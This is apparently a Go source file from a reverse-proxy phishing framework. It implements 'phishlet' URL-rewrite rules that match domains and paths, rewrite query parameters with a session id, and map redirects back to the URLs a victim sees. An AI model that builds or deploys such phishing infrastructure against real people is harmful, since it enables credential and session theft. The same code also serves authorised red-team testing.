package core

import (
	"fmt"
	"net/url"
	"regexp"
	"strings"
)

// addRewriteUrl adds a URL rewrite rule to the phishlet
func (p *Phishlet) addRewriteUrl(trigger_domains []string, trigger_paths []string, rewrite_path string, query *[]ConfigRewriteQuery, exclude_keys *[]string) error {
	rw := RewriteUrl{
		id: GenRandomToken(),
	}

	// Parse trigger domains
	for _, d := range trigger_domains {
		rw.trigger.domains = append(rw.trigger.domains, strings.ToLower(d))
	}

	// Parse trigger paths
	for _, path := range trigger_paths {
		re, err := regexp.Compile(path)
		if err != nil {
			return fmt.Errorf("rewrite_urls: invalid trigger path regex: %v", err)
		}
		rw.trigger.paths = append(rw.trigger.paths, re)
	}

	// Set rewrite path
	rw.rewrite.path = rewrite_path

	// Parse query parameters
	if query != nil {
		for _, q := range *query {
			if q.Key != nil && q.Value != nil {
				rw.rewrite.query = append(rw.rewrite.query, RewriteQuery{
					key:   *q.Key,
					value: *q.Value,
				})
			}
		}
	}

	// Parse exclude keys
	if exclude_keys != nil {
		rw.rewrite.exclude_keys = *exclude_keys
	}

	p.rewrite_urls = append(p.rewrite_urls, rw)
	return nil
}

// GetRewriteUrl checks if a URL should be rewritten and returns the rewrite rule
func (p *Phishlet) GetRewriteUrl(hostname string, path string) (*RewriteUrl, bool) {
	for _, rw := range p.rewrite_urls {
		// Check domain match
		domain_matched := false
		for _, d := range rw.trigger.domains {
			if d == strings.ToLower(hostname) {
				domain_matched = true
				break
			}
		}

		if domain_matched {
			// Check path match
			for _, p_re := range rw.trigger.paths {
				if p_re.MatchString(path) {
					return &rw, true
				}
			}
		}
	}
	return nil, false
}

// Apply executes the rewrite logic on the path and parameters
func (rw *RewriteUrl) Apply(session_id string, params url.Values) (string, url.Values) {
	// 1. New Path
	new_path := rw.rewrite.path

	// 2. Modify Parameters
	new_params := url.Values{}
	
	// Copy existing params unless excluded
	for k, v := range params {
		excluded := false
		for _, ex := range rw.rewrite.exclude_keys {
			if strings.EqualFold(k, ex) {
				excluded = true
				break
			}
		}
		if !excluded {
			new_params[k] = v
		}
	}

	// Add/Overwrite new params
	for _, q := range rw.rewrite.query {
		val := strings.ReplaceAll(q.value, "{id}", session_id)
		new_params.Set(q.key, val)
	}

	return new_path, new_params
}

// UnrewriteUrl checks if a path matches a rewrite rule target and returns the original trigger path
// Used for mapping 302/301 redirects back to user-facing URLs
func (p *Phishlet) UnrewriteUrl(hostname string, path string) (string, bool) {
	for _, rw := range p.rewrite_urls {
		// Check if redirect path matches the rewrite target
		if rw.rewrite.path == path {
			// Check if hostname matches any of the trigger domains
			domain_matched := false
			for _, d := range rw.trigger.domains {
				if d == strings.ToLower(hostname) {
					domain_matched = true
					break
				}
			}

			if domain_matched && len(rw.trigger.paths) > 0 {
				// We need to return a string path, but trigger paths are regexes.
				// This is tricky. We assume the regex is simple enough to be used as path
				// or we rely on the fact that most triggers are exact matches or start/end anchors
				// Ideally, we'd have a 'public_path' field, but for now let's try to extract 
				// a usable path from the regex string.
				
				re_str := rw.trigger.paths[0].String()
				// Remove common regex anchors
				clean_path := strings.TrimPrefix(re_str, "^")
				clean_path = strings.TrimSuffix(clean_path, "$")
				// Remove escapes
				clean_path = strings.ReplaceAll(clean_path, "\\", "")
				
				return clean_path, true
			}
		}
	}
	return "", false
}
